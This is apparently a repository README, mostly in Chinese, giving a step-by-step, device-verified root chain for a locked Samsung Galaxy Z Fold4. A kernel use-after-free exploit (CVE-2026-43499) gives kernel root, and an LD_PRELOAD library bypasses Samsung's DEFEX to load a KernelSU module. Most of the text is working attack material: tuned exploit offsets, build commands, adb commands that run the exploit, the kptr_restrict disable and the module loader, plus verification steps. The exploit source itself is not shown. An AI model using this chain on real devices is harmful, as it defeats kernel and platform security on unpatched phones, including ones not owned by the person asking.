# SM-F9360 (Galaxy Z Fold4 / q4q) 免解锁 Bootloader KernelSU Root

> **CVE-2026-43499 临时 root → LD_PRELOAD 通道绕过 DEFEX → 无 LTO clang-12 版 kernelsu.ko → su + KernelSU Manager 全功能**
>
> 状态：✅ **2026-08-12 真机验证达成**（固件 `F9360ZCSAIZF1`，内核 `5.10.236-android12-9-2755199-abF9360ZCSAIZF1`）
>
> 本项目记录在 **Bootloader 锁定** 的三星设备上达成 KernelSU root 的完整可复现流程：不需要解锁 BL、不需要刷 boot.img、不需要 Odin。

---

**TL;DR (English):** This repo documents a fully device-verified jailbreak path for a locked-bootloader Samsung Galaxy Z Fold4 (SM-F9360, SM8450, kernel 5.10.236, firmware F9360ZCSAIZF1): a CVE-2026-43499 (rtmutex UAF, fixed in July-2026 firmware) exploit chain grants temporary kernel-domain root; a custom LD_PRELOAD constructor `.so` bypasses Samsung's DEFEX execve interceptor to `init_module()` a KernelSU LKM built with the **exact device toolchain (AOSP clang 12.0.5 r416183b) and with LTO disabled** — the two factors that make the module loadable and its init executable on this CFI/LTO hardened kernel. Result: `su` works (`uid=0, context=u:r:ksu:s0`) and KernelSU Manager v3.2.5 recognizes the kernel. Root is in-memory only: every reboot requires re-running the exploit (~3 min, scripted). All pitfalls and dead ends (fake exports, CRC patching, ksud late-load, LTO function-sections layout) are documented below.

---

## 目录

- [1. 成果与本质限制](#1-成果与本质限制)
- [2. 背景：为什么难，为什么可行](#2-背景为什么难为什么可行)
- [3. 攻击链总览（3 层）](#3-攻击链总览3-层)
- [4. 环境要求](#4-环境要求)
- [5. Step 1 — 构建 exploit（临时 root）](#5-step-1--构建-exploit临时-root)
- [6. Step 2 — 构建 kernelsu.ko（无 LTO clang-12 配方）](#6-step-2--构建-kernelsuko无-lto-clang-12-配方)
- [7. Step 3 — 构建 ksu-load.so（DEFEX 绕过加载器）](#7-step-3--构建-ksu-loadsodefex-绕过加载器)
- [8. Step 4 — 设备端执行与验证](#8-step-4--设备端执行与验证)
- [9. 重启后的恢复流程](#9-重启后的恢复流程)
- [10. 关键发现与踩坑清单](#10-关键发现与踩坑清单)
- [11. 固件/内核兼容性](#11-固件内核兼容性)
- [12. 致谢与上游项目](#12-致谢与上游项目)
- [13. 免责声明](#13-免责声明)

---

## 1. 成果与本质限制

| 项目 | 状态 |
|---|---|
| 临时 root（内核域 `kernel:s0`） | ✅ 稳定达成（连续 9 次成功） |
| KernelSU 模块加载（`init_module`） | ✅ `kernelsu ... Live (O)` |
| KSU init 完整执行 | ✅ 15 个埋点 mark 全绿 |
| `su` 命令 | ✅ `uid=0(root) gid=0(root) context=u:r:ksu:s0` |
| KernelSU Manager v3.2.5 | ✅ 识别内核版本（supercall 检测通过），SELinux 强制执行模式下工作 |
| Bootloader 解锁 | ❌ 不需要 |
| 刷机/修改分区 | ❌ 不需要 |

**本质限制：BL 锁 → root 是纯内存态。** 每次重启后需要重跑 exploit + 重新加载模块（全流程约 3 分钟，已脚本化）。`ksud` 用户态 daemon 无法部署（DEFEX 拦 execve，见 §10-4），但 `su` / supercall / Manager 均由内核 sucompat 直接处理，不依赖 ksud。

**警告：`rmmod kernelsu` 会让设备立即 panic 重启（RKP 保护内存上的 syscall-table 还原路径）——永远不要卸载。**

## 2. 背景：为什么难，为什么可行

### 为什么难（三星的防御纵深）

- **BL 锁**：OEM 锁不可解，`fastboot oem unlock` 不存在；任何持久化 root（magisk/kernel patch）都需要刷入 boot.img，而 locked BL 拒绝一切自签镜像。
- **KDP / RKP / DEFEX**：内核数据保护（rodata 物理写会触发 KDP monitor 硬重启）、RKP hypervisor 保护 syscall table、DEFEX 拦截 root 域执行新 ELF。
- **CFI + LTO 内核**：`CONFIG_CFI_CLANG=y` + Full LTO。`mod->init` 的唯一来源是 CFI jump-table 槽 `__cfi_jt_init_module`；间接调用必须走 `.cfi_jt` 表项，否则 CFI 检查直接 panic。
- **TRIM_UNUSED_KSYMS**：~40 个 KSU 需要的符号被从 `__ksymtab` 导出表裁掉，普通 `insmod` 无法解析（`Unknown symbol`）。
- **MODULE_FORCE_LOAD=n + modversions**：vermagic 必须逐字符精确匹配；`IGNORE_MODVERSIONS`/`IGNORE_VERMAGIC` 标志全部走 `try_to_force_load()` 死路。

### 为什么可行

1. **CVE-2026-43499**（rtmutex proxy-lock 回滚 UAF，主线上游 2026-07 修复）在 **2026-06 及更早固件**上可稳定提权到内核域——社区已有同 SoC（SM8450）+ 同内核分支（5.10）的**真机验证**移植：`sarabpal-dev/IonStack-S22U`（b0q / S22U，exp32 路由）。
2. **DEFEX 只拦 execve，不拦动态加载**：`LD_PRELOAD` constructor `.so` 是 root 域执行任意代码的唯一豁免通道。
3. **KernelSU v3.2+ 的 jailbreak 模式**（`ksud late-load`）就是为锁 BL 设备设计的：不刷 boot，直接运行时 `init_module`。
4. **工具链匹配原则**：CFI type-id 是 LLVM 内部 hash，模块必须用**与设备内核完全相同的编译器**构建（q4q 设备 = AOSP clang 12.0.5 r416183b）。
5. **LTO 拆分布局是模块崩溃的终极根因**：function-sections 产出的 447 个 ALLOC 小段在三星内核加载器上必崩；**禁 LTO 重编 → 传统 22 段布局 → 一次成功**（详见 §10-1）。

## 3. 攻击链总览（3 层）

```
┌─ Layer 1: CVE-2026-43499 临时 root
│   ionstack-q4q exploit（KASLR 泄漏 → mm reclaim → exp32 32-bit 栈 stamp
│   → CFI r/w → pipe physrw → UMH root daemon）
│   → /data/local/tmp/cve-2026-43499-root -c '<cmd>' = kernel:s0 域 root 命令通道
│
├─ Layer 2: LD_PRELOAD .so 加载通道（DEFEX 绕过）
│   DEFEX 拦截 kernel 域 execve 任何新 ELF（Killed）；LD_PRELOAD 的 constructor
│   执行豁免 → ksu-load.so 在 /system/bin/true 进程内：
│   读 ko → /proc/kallsyms 手工重定位 201 个 UND 符号（SHN_ABS + st_value=绝对地址）
│   → vermagic patch（旧版需要）→ init_module() → 成功
│
└─ Layer 3: KernelSU 内核模块（无 LTO clang-12 版）
    init 完整执行 15 mark 全绿 → sucompat (allow_shell=1) + supercall 可用
```

## 4. 环境要求

### 设备

| 项目 | 值 |
|---|---|
| 型号 | SM-F9360（Galaxy Z Fold4，q4q） |
| SoC | SM8450（Snapdragon 8+ Gen 1） |
| 固件 | `F9360ZCSAIZF1`（**≤ 2026-06 构建，含 CVE**） |
| 内核 | `5.10.236-android12-9-2755199-abF9360ZCSAIZF1` |
| 设备编译器 | **AOSP clang 12.0.5 (r416183b, c935d99d7cf)**（`/proc/version` 确认） |
| 精确 vermagic | `5.10.236-android12-9-2755199-abF9360ZCSAIZF1 SMP preempt mod_unload modversions aarch64` |

> 不同固件 = 不同的 kallsyms / 布局 / vermagic，需要重新适配 target.h 与重编。见 §11。

### 构建机

- macOS 宿主 + **colima/docker，Ubuntu 24.04 aarch64 容器**（x86_64 clang 二进制在 arm64 容器跑不了；macOS 宿主构建是工具地狱，一律容器化）
- 容器内：`clang-14/15` + **focal 源 `clang-12` / `lld-12`**（`/usr/bin/clang-12`、`/usr/bin/ld.lld-12`）
- 容器无 gcc → make 必须 `CC=clang HOSTCC=clang LD=ld.lld-12`
- NDK r29（构建 exploit 与 ksu-load.so）
- 三星内核源码：GitHub 镜像 `FryUpDoe/android_kernel_samsung_q4q`（opensource.samsung.com 有 Cloudflare 反爬）

## 5. Step 1 — 构建 exploit（临时 root）

exploit 基于 `sarabpal-dev/IonStack-S22U`（SM8450 5.10 真机 GREEN 基座，exp32 路由）。q4q 适配 = 仓库内 `patches/ionstack-q4q-adapt.patch`（249 行，覆盖 target.h 参数、kernelsnitch、root.c 等）。

```bash
export ANDROID_NDK_HOME=$HOME/Projects/f9360-root/tools/android-ndk-r29
cd work/ionstack-q4q          # IonStack-S22U clone + 本 patch
make PROJECT=q4q-F9360ZCSAIZF1   # 注意变量名是 PROJECT= 不是 TARGET=
```

q4q 关键参数（已调优，勿改）：

| 参数 | 值 | 为什么 |
|---|---|---|
| `P0_KERNEL_PHYS_LOAD` | `0xa8000000` | b0q/S22U 真机值（SM8450 全系约定；0x80080000 是误对齐假阳） |
| `APP_KERNEL_PAGE_KSNITCH_IDENTITY_END` | `0xffffff8b00000000`（44GB） | 设备内存分散在 phys 33.8–39.5GB，2GB 窗口（e2s 抄来的）永远找不到 |
| `KERNELSNITCH_FUTEX_HASH_SIZE` | `2048` | 内核 `roundup_pow2(256*8)`=2048，默认 4096 导致 mm leak 全失败 |
| `KERNELSNITCH_MTE_ENABLED` | `0` | 生产内核 `kasan=off`，MTE 未激活 |
| `EXP32_STAMP_OFF` | `0x58` | 反汇编推导（b0q/q4q 的 `futex_wait_requeue_pi` 与 compat `do_ipv6_setsockopt` 帧一致） |
| fork 32→16 组 / `APPENDED_FUTEXES` 4096→1024 | — | 降低系统负载，防 LMKD SIGKILL |
| `KSU_LOAD_ONLY=1`（root.c） | — | 跳过 fake_exports（ksu-load.so 手工重定位替代） |

产出 3 个二进制（`build/q4q-F9360ZCSAIZF1/`）：preload `.so`、app `.so`、root helper PIE。**设备端实测必须在低负载下运行**（`loadavg < 2.5`，开机后等 1–2 分钟），高负载下 exploit 的 fork 风暴（~544 线程 + 1024 futex park 线程）会被 LMKD 静默 SIGKILL。

## 6. Step 2 — 构建 kernelsu.ko（无 LTO clang-12 配方）

这是本项目最核心的可复现配方。**先讲原理，再给命令。**

### 为什么必须：三个铁律

1. **编译器必须与设备同代（clang 12.0.5）**：CFI type-id 是 LLVM 内部 hash。clang-15/18 编的 ko 在设备上 `__cfi_check_fail` → 直接 panic（无 CFI_PERMISSIVE）。Ubuntu clang-12 与 AOSP clang-12 行为也略有差异，但 CFI 关闭后（见下）差异不再致命。
2. **必须关 LTO（终极根因）**：三星树默认 `CONFIG_LTO_CLANG_THIN=y` → `-ffunction-sections` 拆分布局（447 个 ALLOC 小段，`.text=0`）→ **任何版本（连 stub）加载即内核 panic**。官方 ko 是传统布局（22 段）→ 一直能加载。关 LTO 重编 → 一次成功。
3. **必须关 CFI**：模块不带 `__cfi_check` 符号 → `mod->cfi_check=NULL` → `cfi_init` 的 shadow 注册被跳过 → 调用不经 CFI 检查。**但注意**：`mod->init` 的唯一来源是 CFI jt 槽 `__cfi_jt_init_module`（`kernel/module.c cfi_init()`）——**非 CFI 编译且没有 jt 槽的 ko 会 "Live" 但 init 从不执行**（假成功！）。clang-12 天然生成 `D __cfi_jt_init_module` 槽，无需手工 objcopy。

### 三星树修改

```bash
# 1) 禁 per-task sysreg stack guard（Ubuntu clang-12 不支持 -mstack-protector-guard=sysreg）
#    arch/arm64/Makefile: ifeq ($(CONFIG_STACKPROTECTOR_PER_TASK),y) → ifeq (n,y)
#    模块 stack protector 回退全局 __stack_chk_guard（kallsyms 有导出，安全）

# 2) .config 与 include/config/auto.conf 同步修改（auto.conf 是 make 实际读的）：
#    CONFIG_LTO_CLANG_THIN=y → # CONFIG_LTO_CLANG_THIN is not set
#    CONFIG_LTO_CLANG=y → not set
#    CONFIG_LTO=y → not set
#    CONFIG_LTO_NONE=y
#    CONFIG_CFI_CLANG=y / CONFIG_CFI_CLANG_SHADOW=y → not set
#    + CONFIG_SECTION_MISMATCH_WARN_ONLY=y
#      （jt 槽 .data→.init 引用会被 modpost 拦成 ERROR，必须开）

# 3) KSU 源码就位 drivers/kernelsu/
#    （KernelSU v3.2.5 + BuSung samsung-kdp-rkp-defex patch；Kconfig/Makefile 已接入）
```

### 构建

```bash
docker exec ksu-build bash -c "cd /kernel && find drivers/kernelsu -name '*.o' -delete; \
  make M=drivers/kernelsu LD=ld.lld-12 CC=clang-12 CONFIG_KSU=m \
  CONFIG_KSU_SAMSUNG_KDP=y CONFIG_KSU_SAMSUNG_RKP=y CONFIG_KSU_SAMSUNG_DEFEX=y \
  CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y modules"
```

> ⚠️ **清 `.o` 是必须的**：`.o` 缓存不会因 .config 变化自动重建，残留 function-sections 产物会导致假成功/假崩溃。

### 产物验证清单（全过才推设备）

```bash
# .text 是统一段（~0x1133c），不是 function-sections 拆分布局
llvm-readelf -S kernelsu.ko | grep -c '\.text\.'   # 应为 0
# jt 槽存在（mod->init 唯一来源）
llvm-nm kernelsu.ko | grep __cfi_jt_init_module    # D __cfi_jt_init_module
# vermagic 精确匹配设备（用设备树编的天然匹配，无需 patch）
modinfo kernelsu.ko | grep vermagic
# 201 个 UND 符号、无 __cfi_check（模块不参与 CFI shadow）
llvm-readelf -s kernelsu.ko | grep -c UND
llvm-nm kernelsu.ko | grep __cfi_check            # 应为空
```

成功版模块见 `release/kernelsu-c12-nolto.ko`（SHA256SUMS 校验）。

## 7. Step 3 — 构建 ksu-load.so（DEFEX 绕过加载器）

**DEFEX 语义（实测测绘结论，推翻社区旧认知）**：

| 执行路径 | 结果 |
|---|---|
| shell 域（adb）exec 新 ELF | ✅ 放行（但无 root：无 CAP_SYS_MODULE / CAP_CHOWN） |
| kernel:s0 域 exec 新 ELF | ❌ Killed（DEFEX 拦提权域逃逸） |
| setexeccon 降域后 exec | ❌ 仍 Killed（DEFEX 追踪 LD_PRELOAD 链本身，与域无关） |
| **LD_PRELOAD constructor .so 载入已有二进制** | ✅ **放行（唯一 root 域代码执行通道）** |
| UMH spawn（exploit 的 root daemon） | ✅ 放行 |

因此 ksud 自身流程在三星上跑不通（kernel 域 exec 被拦，shell 域无权限），**自建加载器** = `loader/ksu-load.c`（`KSU_LOAD_AS_SO` 宏 = constructor 版）：

1. constructor 读 `$KSU_KO_PATH`
2. 开 `/proc/kallsyms`（先经 root 通道 `echo 0 > /proc/sys/kernel/kptr_restrict`）
3. 对 `.symtab` 每个 UND 符号：kallsyms 查绝对地址 → `SHN_ABS + st_value=地址`
   - 上限 600000 条（设备实际 489702 条；65536 的旧上限会静默截断报全部 MISSING）
   - `patched=201 missing=0` 为全解
   - **SHN_ABS 符号永不进 `find_symbol()`/`check_version()` → TRIM_UNUSED_KSYMS 与 modversions CRC 两堵墙同时消失**
4. `KSU_VERMAGIC_PATCH=1`（旧版 ko 需要）：缩短 .modinfo 的 scmversion/author/description 原位腾字节 → 写入设备精确 vermagic 串（无 LTO 版 vermagic 自动匹配，不需要）
5. `init_module(fd, params)` → 日志写 /data/local/tmp/ksu-load.log（**无缓冲 stderr**，崩溃不丢日志）

```bash
$ANDROID_NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android30-clang \
  -shared -fPIC -O2 -DKSU_LOAD_AS_SO -o ksu-load.so ksu-load.c
```

## 8. Step 4 — 设备端执行与验证

### 8.1 推资产

```bash
adb -s RFCW31TJJ0T push release/kernelsu-c12-nolto.ko /data/local/tmp/
adb -s RFCW31TJJ0T push release/ksu-load.so /data/local/tmp/
adb -s RFCW31TJJ0T push build/q4q-F9360ZCSAIZF1/cve-2026-43499-app.so /data/local/tmp/
adb -s RFCW31TJJ0T push build/q4q-F9360ZCSAIZF1/cve-2026-43499-root /data/local/tmp/
# panic 会清零 F2FS 页缓存 —— 每次 panic 后必须 MD5 重新核对/重推
```

### 8.2 临时 root

```bash
# 重启后必须等 loadavg < 2.5（watch /proc/loadavg）再跑，高负载必失败
# ⚠️ 清残留禁用 pkill -f：-f 模式会匹配执行者自身 shell 的 cmdline → SIGKILL 自杀 (2026-09-01 实测)。
#    残留用 ps 核对后按 PID 点名杀；无残留直接跳过清理。
# ⚠️ EXPLOIT_ATTEMPTS=1：attempt 1 失败时设备状态已被污染，自动补射第 2 发只会滚进不稳定状态（历史: retry→attempt2→后续 panic）。
#    一次成败，失败即停、取证、重启重来。
adb -s RFCW31TJJ0T shell "
  cd /data/local/tmp
  KSU_LOAD_ONLY=1 EXP32_STAMP_OFF=0x58 EXPLOIT_ATTEMPTS=1 \
  LD_PRELOAD=/data/local/tmp/cve-2026-43499 nohup sh -c 'sleep 3600' > exp.log 2>&1
"
adb -s RFCW31TJJ0T shell "/data/local/tmp/cve-2026-43499-root -c 'id'"
# → uid=0(root) gid=0(root) context=u:r:kernel:s0
```

### 8.3 加载 KSU 模块

```bash
adb -s RFCW31TJJ0T shell "
  timeout 10 cve-2026-43499-root -c 'echo 0 > /proc/sys/kernel/kptr_restrict'
  timeout 60 cve-2026-43499-root -c 'sh -c \"KSU_KO_PATH=/data/local/tmp/kernelsu-c12-nolto.ko \
    KSU_KO_PARAMS=allow_shell=1 LD_PRELOAD=/data/local/tmp/ksu-load.so \
    /system/bin/true > /data/local/tmp/ksu-load.log 2>&1\"'
"
cat /data/local/tmp/ksu-load.log
# 成功标志: patched=201 missing=0 | KernelSU loaded OK (manual relocation, 201 symbols)
adb -s RFCW31TJJ0T shell "cat /proc/modules | grep kernelsu"
# → kernelsu 147456 0 - Live (O)
```

### 8.4 验证清单（全绿）

```bash
# 1. KSU init 15 mark（/data/local/tmp/ksu-init.log）:
#    entry → resolver-ok → kdp-ok → cred-ok → defex-ok → syscallhook-ok
#    → features-ok → supercalls-ok → rules-ok → cachesid-ok → setupcred-ok
#    → escape-ok → allowlist-ok → hookmanager-ok → late-done
# 2. su:
adb -s RFCW31TJJ0T shell "su -c id"
# → uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
# 3. KSU Manager v3.2.5 主页显示:
#    「内核版本 5.10.236-android12-9-2755199-abF9360ZCSAIZF1」= supercall 通过
#    SELinux 强制执行 + Seccomp 过滤模式下正常工作
```

## 9. 重启后的恢复流程

```bash
# 1. 重启 → 等 loadavg < 2.5
# 2. 跑 §8.2 exploit（一次成功率高）→ 验证 root
# 3. 跑 §8.3 加载 → 验证 /proc/modules
# 4. su 可用 + Manager 识别
# 5. ⚠️ force-stop + 重开 Manager：模块加载前已开着的管理器进程缓存了"未安装"状态
#    （内核后来才加冕它，旧进程拿不到 ksu fd），不重开会一直错显"未安装"：
adb -s RFCW31TJJ0T shell "am force-stop me.weishu.kernelsu; am start -n me.weishu.kernelsu/.ui.MainActivity"
# 全流程 ~3 分钟。scripts/restore-root.sh 为半自动模板。
```

## 10. 关键发现与踩坑清单

### 10.1 LTO 拆分布局 = 模块崩溃终极根因（本项目最大发现）

- 现象：clang-12 编的 kernelsu 加载即崩，**连 init 打桩（ret）的 stub 版也崩**，而官方 clang-12 ko 的 stub 版能加载 → 模块级差异，不是 init 代码问题。
- 二分链：RELA flags 相同 → 特殊段（`__jump_table`/`.altinstructions`/`.note.gnu.property`）官方也有 → **唯一差异 = function-sections 拆分布局**（我们的 ko 447 个 ALLOC 段 vs 官方 22 段）。
- 修复：`CONFIG_LTO_CLANG_THIN` 全套关闭 + 清 `.o` 重编 → 传统布局 → **一次加载成功，init 15 mark 全绿**。
- 教训：`.o` 缓存不因 .config 变化重建；改配置必须 `find drivers/kernelsu -name '*.o' -delete`。

### 10.2 `mod->init` 唯一来源 = CFI jt 槽

`kernel/module.c cfi_init()`：`mod->init = *find_kallsyms_symbol_value(mod, "__cfi_jt_init_module")`。非 CFI 构建且无 jt 槽的 ko → `mod->init=NULL` → `do_init_module` 跳过 → **模块 "Live" 但 init 从未执行**（ksu_cred 没建、hook 没注册——此前一切 "Live 空壳" 现象的根源）。clang-12 天然生成 jt 槽；clang-14 的 `-fsanitize=cfi` 会生成但 LTO 链接后丢弃（死路）。

### 10.3 编译器匹配（CFI type-id）

设备 `/proc/version` = `Android (7284624, based on r416183b) clang version 12.0.5`。clang-15/18 编的 ko 在设备上 `__cfi_check_fail` → panic 且无 CFI_PERMISSIVE。**查 `/proc/version`，用同代编译器**。AOSP clang r416183b 下载（446MB）：`https://android.googlesource.com/platform/prebuilts/clang/host/linux-x86/+archive/refs/heads/android12-release/clang-r416183b.tar.gz`（分支必须是 `android12-release`；x86_64 版在 arm64 容器跑不了）。Ubuntu clang-12 需改三星 Makefile 禁 sysreg guard（见 §6）。

### 10.4 DEFEX 精确语义

见 §7 表格。核心：**LD_PRELOAD constructor 是唯一豁免通道**；`setexeccon` 降域无效；ksud late-load 路线作废，自建加载器。`libksud.so`（Manager 内嵌库版 ksud）可从 app 域启动但被 seccomp 拦 syscall 142，未及利用。

### 10.5 vermagic 必须精确匹配

`CONFIG_MODULE_FORCE_LOAD=n` → `IGNORE_VERMAGIC`/`IGNORE_MODVERSIONS` 标志全走 `try_to_force_load()` → ENOEXEC 死路。设备 vermagic 带 LOCALVERSION 后缀（`-2755199-abF9360ZCSAIZF1`），用设备树（正确的 SUBLEVEL/EXTRAVERSION/LOCALVERSION）编出来的 ko 天然精确匹配。zero-`__versions` 模块（KSU 官方风格）在 `same_magic` 里是**全串比较**，必须逐字符一致。

### 10.6 其余坑

1. **exploit 负载门控**：开机后 loadavg ≥ 2.5 必失败（LMKD SIGKILL，日志停在 `find_collisions` 同字节数）。等负载降再跑。
2. **panic 后文件清零**：F2FS 页缓存损坏，`/data/local/tmp` 文件可能被清零——panic 后 MD5 核对所有二进制。
3. **禁用 `pkill -9 -f` 清残留**（双重坑，2026-09-01 均实测）：`-f` 模式会匹配执行者自身 shell 的 cmdline → 直接 SIGKILL 自己（exit 137）；且若 root daemon 还活着也会一并误杀。残留只准 `ps` 核对后按 PID 点名杀，无残留则跳过。
4. **tracefs slide 泄漏跨 boot 不稳定**：成功 boot 的 slide 稳定；失败 boot（CFI mismatch）直接重启重试，不要 chase 代码。
5. **stdout 块缓冲丢日志**：重定向到文件时 printf 是块缓冲，panic 时丢最后一段日志。`set_unbuffer()`（kernelsu 工具链自带）在 `run_exploit` 里调用，此前从未被调用。
6. **kptr_restrict=2 连内核域 root 都隐藏地址**：先 `echo 0 > /proc/sys/kernel/kptr_restrict`，加载器必须跳过 addr==0 行。
7. **kallsyms 489k 条**：加载器数组上限 ≥600k，65536 会静默截断报全 MISSING。
8. **KDP/RKP/DEFEX patch 必打**：原版 KSU 在三星上普通 `put_cred` 写 KDP cred → 同步外部中止 panic。
9. **`rmmod kernelsu` 必 panic**（§1）。
10. **容器无 gcc**：make 必须 `CC=clang HOSTCC=clang LD=ld.lld-12`，否则 cc-wrapper `execvp gcc` Error 255。
11. **尝试过但放弃的路线**（详见 §12 上游与 docs/PORTING-TIMELINE.md）：
    - 39 符号 wrapper shim（ksu_syms.c）→ 能过 modpost，但撞 modversions CRC 墙；
    - fake-exports ksymtab 劫持 + kcrctab physrw dump → 可行但 32KB 逐字节 pipe 读太慢，且 rodata 写有 KDP panic 风险；
    - ksud late-load → DEFEX 拦 execve，作废。
    - **SHN_ABS 手工重定位 = 终局方案**：一石三鸟（TRIM 符号、CRC、vermagic 兼容），零内核内存写。

## 11. 固件/内核兼容性

- **CVE-2026-43499 修复窗口**：Samsung 2026-07 固件已修复。目标固件必须 ≤ 2026-06 构建。
- 本仓库所有产物（ko/vermagic/参数）绑定 `F9360ZCSAIZF1`。其他固件需：
  1. 用对应固件的 boot.img 重导 kallsyms 与布局（`vmlinux-to-elf` + `llvm-nm`）；
  2. 更新 target.h 的 25 个符号偏移 + P0 指纹表（`tools/generate_p0_fingerprint.pl`）；
  3. 用该固件对应的内核树重编 ko（vermagic 自动匹配）；
  4. 同 SoC（SM8450）的 b0q/S22U 社区移植证明 `0xa8000000` 是长生命周期约定，大概率不用动。
- 同内核分支的其他三星设备（如 S22 系列 5.10）可作为移植参考基座，但**每个设备的 task_struct 偏移、mm_struct objsize、ksm 参数都要独立验证**（跨设备复制偏移 = 必崩）。

## 12. 致谢与上游项目

- [CVE-2026-43499](https://github.com/BuSung-dev/Root-My-Galaxy) 生态：`BuSung-dev/Root-My-Galaxy` / `Root-My-Galaxy-Payloads`（原始漏洞利用与 payload 框架）
- `sarabpal-dev/IonStack-S22U` — SM8450 5.10 **真机 GREEN** 移植基座（exp32 路由），本项目 exploit 直接基于它
- `tiann/KernelSU` v3.2.5 — jailbreak 模式（`ksud late-load`）+ 模块本体
- BuSung 的 `KernelSU-v3.2.5-samsung-kdp-rkp-defex.patch` — 三星 KDP/RKP/DEFEX 适配
- `xunchahaha/mi_nobl_root` — SHN_ABS patch 思路的 Python 参考实现
- `FryUpDoe/android_kernel_samsung_q4q` — 内核源码镜像
- 酷安社区"大佬适配版" RMG APK（42 固件 payloads）——逆向素材与情报来源

## 13. 免责声明

本项目**仅用于安全研究与个人设备测试**。利用锁 BL 设备上的已知漏洞（CVE-2026-43499）绕过平台安全机制，可能违反设备保修条款与服务条款。**一切风险自负**：内核 panic、数据丢失、设备变砖（低概率但存在）均由使用者承担。请勿用于任何未经授权的设备。CVE 已在 2026-07 上游修复，请及时更新固件。

---

**LICENSE**：仓库自有代码（loader/ksu-load.c、scripts/、本文档）为 MIT；`release/kernelsu-c12-nolto.ko` 衍生自 GPL-2.0 的 KernelSU 与三星内核源码（GPL-2.0）；`patches/ionstack-q4q-adapt.patch` 随上游项目许可。
